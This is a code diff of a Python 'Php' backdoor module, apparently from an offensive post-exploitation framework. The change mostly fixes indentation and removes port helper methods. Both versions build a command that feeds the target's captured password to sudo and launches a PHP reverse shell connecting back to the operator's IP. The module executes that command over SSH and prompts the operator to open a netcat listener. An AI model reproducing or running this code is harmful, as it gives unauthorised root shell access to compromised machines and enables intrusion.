@@ -12,17 +12,14 @@ class Php(Backdoor):
                 }
         self.allow_modules = True
         self.modules = {}
-        self.portModules = {}
-
-    def get_port(self):
-        return self.get_value("port")
+        self.help_text = "" 
 
     def get_command(self):
-	return "echo " + self.core.curtarget.pword + " | sudo -S php -r '$sock=fsockopen(\"" + self.core.localIP + "\"," + str(self.get_value("port")) + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+        return "echo " + self.core.curtarget.pword + " | sudo -S php -r '$sock=fsockopen(\"" + self.core.localIP + "\"," + str(self.get_value("port")) + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
 
     def do_exploit(self, args):
         port = self.get_value("port")
-	target = self.core.curtarget
+        target = self.core.curtarget
         raw_input("Please enter the following command: nc -v -n -l -p %s in another shell to connect." % port)
         print(GOOD + "Initializing backdoor...")
         target.ssh.exec_command(self.get_command())
